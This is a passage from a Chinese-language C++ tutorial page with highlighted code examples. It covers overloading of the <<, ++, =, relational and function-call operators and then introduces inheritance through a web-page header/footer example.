<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">	<span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out, Person&amp; p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a, <span class="type">int</span> b)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_A = a;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_B = b;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//成员函数 实现不了  p &lt;&lt; cout 不是我们想要的效果</span></span><br><span class="line">	<span class="comment">//void operator&lt;&lt;(Person&amp; p)&#123;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_A;</span><br><span class="line">	<span class="type">int</span> m_B;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//全局函数实现左移重载</span></span><br><span class="line"><span class="comment">//ostream对象只能有一个</span></span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out, Person&amp; p) &#123;</span><br><span class="line">	out &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; p.m_A &lt;&lt; <span class="string">&quot; b:&quot;</span> &lt;&lt; p.m_B;</span><br><span class="line">	<span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>, <span class="number">20</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; p1 &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl; <span class="comment">//链式编程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>总结：重载左移运算符配合友元可以实现输出自定义数据类型</p>
</blockquote>
<h4 id="4-5-3-递增运算符重载"><a href="#4-5-3-递增运算符重载" class="headerlink" title="4.5.3 递增运算符重载"></a>4.5.3 递增运算符重载</h4><p>作用： 通过重载递增运算符，实现自己的整型数据</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyInteger</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out, MyInteger myint);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">MyInteger</span>() &#123;</span><br><span class="line">		m_Num = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//前置++</span></span><br><span class="line">	MyInteger&amp; <span class="keyword">operator</span>++() &#123;</span><br><span class="line">		<span class="comment">//先++</span></span><br><span class="line">		m_Num++;</span><br><span class="line">		<span class="comment">//再返回</span></span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//后置++</span></span><br><span class="line">	MyInteger <span class="keyword">operator</span>++(<span class="type">int</span>) &#123;</span><br><span class="line">		<span class="comment">//先返回</span></span><br><span class="line">		MyInteger temp = *<span class="keyword">this</span>; <span class="comment">//记录当前本身的值，然后让本身的值加1，但是返回的是以前的值，达到先返回后++；</span></span><br><span class="line">		m_Num++;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> m_Num;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out, MyInteger myint) &#123;</span><br><span class="line">	out &lt;&lt; myint.m_Num;</span><br><span class="line">	<span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//前置++ 先++ 再返回</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	MyInteger myInt;</span><br><span class="line">	cout &lt;&lt; ++myInt &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; myInt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后置++ 先返回 再++</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	MyInteger myInt;</span><br><span class="line">	cout &lt;&lt; myInt++ &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; myInt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">	<span class="comment">//test02();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>总结： 前置递增返回引用，后置递增返回值</p>
</blockquote>
<h4 id="4-5-4-赋值运算符重载"><a href="#4-5-4-赋值运算符重载" class="headerlink" title="4.5.4 赋值运算符重载"></a>4.5.4 赋值运算符重载</h4><p>c++编译器至少给一个类添加4个函数</p>
<ol>
<li>默认构造函数(无参，函数体为空)</li>
<li>默认析构函数(无参，函数体为空)</li>
<li>默认拷贝构造函数，对属性进行值拷贝</li>
<li>赋值运算符 operator&#x3D;, 对属性进行值拷贝</li>
</ol>
<p>如果类中有属性指向堆区，做赋值操作时也会出现深浅拷贝问题</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//将年龄数据开辟到堆区</span></span><br><span class="line">		m_Age = <span class="keyword">new</span> <span class="built_in">int</span>(age);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//重载赋值运算符 </span></span><br><span class="line">	Person&amp; <span class="keyword">operator</span>=(Person &amp;p)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (m_Age != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_Age;</span><br><span class="line">			m_Age = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//编译器提供的代码是浅拷贝</span></span><br><span class="line">		<span class="comment">//m_Age = p.m_Age;</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">//提供深拷贝 解决浅拷贝的问题</span></span><br><span class="line">		m_Age = <span class="keyword">new</span> <span class="built_in">int</span>(*p.m_Age);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//返回自身</span></span><br><span class="line">		<span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	~<span class="built_in">Person</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (m_Age != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">delete</span> m_Age;</span><br><span class="line">			m_Age = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//年龄的指针</span></span><br><span class="line">	<span class="type">int</span> *m_Age;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">18</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p2</span><span class="params">(<span class="number">20</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">p3</span><span class="params">(<span class="number">30</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	p3 = p2 = p1; <span class="comment">//赋值操作</span></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p1的年龄为：&quot;</span> &lt;&lt; *p1.m_Age &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p2的年龄为：&quot;</span> &lt;&lt; *p2.m_Age &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;p3的年龄为：&quot;</span> &lt;&lt; *p3.m_Age &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//int a = 10;</span></span><br><span class="line">	<span class="comment">//int b = 20;</span></span><br><span class="line">	<span class="comment">//int c = 30;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//c = b = a;</span></span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;c = &quot; &lt;&lt; c &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h4 id="4-5-5-关系运算符重载"><a href="#4-5-5-关系运算符重载" class="headerlink" title="4.5.5 关系运算符重载"></a>4.5.5 关系运算符重载</h4><p><strong>作用：</strong>重载关系运算符，可以让两个自定义类型对象进行对比操作</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>(string name, <span class="type">int</span> age)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Name = name;</span><br><span class="line">		<span class="keyword">this</span>-&gt;m_Age = age;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">bool</span> <span class="keyword">operator</span>==(Person &amp; p)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_Name == p.m_Name &amp;&amp; <span class="keyword">this</span>-&gt;m_Age == p.m_Age)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">bool</span> <span class="keyword">operator</span>!=(Person &amp; p)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>-&gt;m_Name == p.m_Name &amp;&amp; <span class="keyword">this</span>-&gt;m_Age == p.m_Age)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	string m_Name;</span><br><span class="line">	<span class="type">int</span> m_Age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//int a = 0;</span></span><br><span class="line">	<span class="comment">//int b = 0;</span></span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">a</span><span class="params">(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">18</span>)</span></span>;</span><br><span class="line">	<span class="function">Person <span class="title">b</span><span class="params">(<span class="string">&quot;孙悟空&quot;</span>, <span class="number">18</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (a == b)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;a和b相等&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;a和b不相等&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (a != b)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;a和b不相等&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;a和b相等&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="4-5-6-函数调用运算符重载"><a href="#4-5-6-函数调用运算符重载" class="headerlink" title="4.5.6 函数调用运算符重载"></a>4.5.6 函数调用运算符重载</h4><ul>
<li>函数调用运算符 ()  也可以重载</li>
<li>由于重载后使用的方式非常像函数的调用，因此称为仿函数</li>
<li>仿函数没有固定写法，非常灵活</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(string text)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; text &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//重载的（）操作符 也称为仿函数</span></span><br><span class="line">	MyPrint myFunc;</span><br><span class="line">	<span class="built_in">myFunc</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyAdd</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> v1, <span class="type">int</span> v2)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> v1 + v2;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MyAdd add;</span><br><span class="line">	<span class="type">int</span> ret = <span class="built_in">add</span>(<span class="number">10</span>, <span class="number">10</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ret = &quot;</span> &lt;&lt; ret &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//匿名对象调用  </span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;MyAdd()(100,100) = &quot;</span> &lt;&lt; <span class="built_in">MyAdd</span>()(<span class="number">100</span>, <span class="number">100</span>) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">	<span class="built_in">test02</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<h3 id="4-6-继承"><a href="#4-6-继承" class="headerlink" title="4.6  继承"></a>4.6  继承</h3><p><strong>继承是面向对象三大特性之一</strong></p>
<p>有些类与类之间存在特殊的关系，例如下图中：</p>


<p>我们发现，定义这些类时，下级别的成员除了拥有上一级的共性，还有自己的特性。</p>
<p>这个时候我们就可以考虑利用继承的技术，减少重复代码</p>
<h4 id="4-6-1-继承的基本语法"><a href="#4-6-1-继承的基本语法" class="headerlink" title="4.6.1 继承的基本语法"></a>4.6.1 继承的基本语法</h4><p>例如我们看到很多网站中，都有公共的头部，公共的底部，甚至公共的左侧列表，只有中心内容不同</p>
<p>接下来我们分别利用普通写法和继承的写法来实现网页中的内容，看一下继承存在的意义以及好处</p>
<p><strong>普通实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Java页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Java</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">header</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">footer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">left</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">content</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;JAVA学科视频&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//Python页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Python</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">header</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">footer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">left</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">content</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Python学科视频&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//C++页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CPP</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">header</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">footer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">left</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">content</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;C++学科视频&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//Java页面</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Java下载视频页面如下： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Java ja;</span><br><span class="line">	ja.<span class="built_in">header</span>();</span><br><span class="line">	ja.<span class="built_in">footer</span>();</span><br><span class="line">	ja.<span class="built_in">left</span>();</span><br><span class="line">	ja.<span class="built_in">content</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Python页面</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Python下载视频页面如下： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Python py;</span><br><span class="line">	py.<span class="built_in">header</span>();</span><br><span class="line">	py.<span class="built_in">footer</span>();</span><br><span class="line">	py.<span class="built_in">left</span>();</span><br><span class="line">	py.<span class="built_in">content</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//C++页面</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;C++下载视频页面如下： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	CPP cp;</span><br><span class="line">	cp.<span class="built_in">header</span>();</span><br><span class="line">	cp.<span class="built_in">footer</span>();</span><br><span class="line">	cp.<span class="built_in">left</span>();</span><br><span class="line">	cp.<span class="built_in">content</span>();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>继承实现：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//公共页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BasePage</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">header</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;首页、公开课、登录、注册...（公共头部）&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">footer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;帮助中心、交流合作、站内地图...(公共底部)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">left</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Java,Python,C++...(公共分类列表)&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Java页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Java</span> : <span class="keyword">public</span> BasePage</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">content</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;JAVA学科视频&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//Python页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Python</span> : <span class="keyword">public</span> BasePage</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">content</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Python学科视频&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//C++页面</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CPP</span> : <span class="keyword">public</span> BasePage</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">content</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;C++学科视频&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//Java页面</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Java下载视频页面如下： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Java ja;</span><br><span class="line">	ja.<span class="built_in">header</span>();</span><br><span class="line">	ja.<span class="built_in">footer</span>();</span><br><span class="line">	ja.<span class="built_in">left</span>();</span><br><span class="line">	ja.<span class="built_in">content</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//Python页面</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;Python下载视频页面如下： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	Python py;</span><br><span class="line">	py.<span class="built_in">header</span>();</span><br><span class="line">	py.<span class="built_in">footer</span>();</span><br><span class="line">	py.<span class="built_in">left</span>();</span><br><span class="line">	py.<span class="built_in">content</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;--------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//C++页面</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;C++下载视频页面如下： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	CPP cp;</span><br><span class="line">	cp.<span class="built_in">header</span>();</span><br><span class="line">	cp.<span class="built_in">footer</span>();</span><br><span class="line">	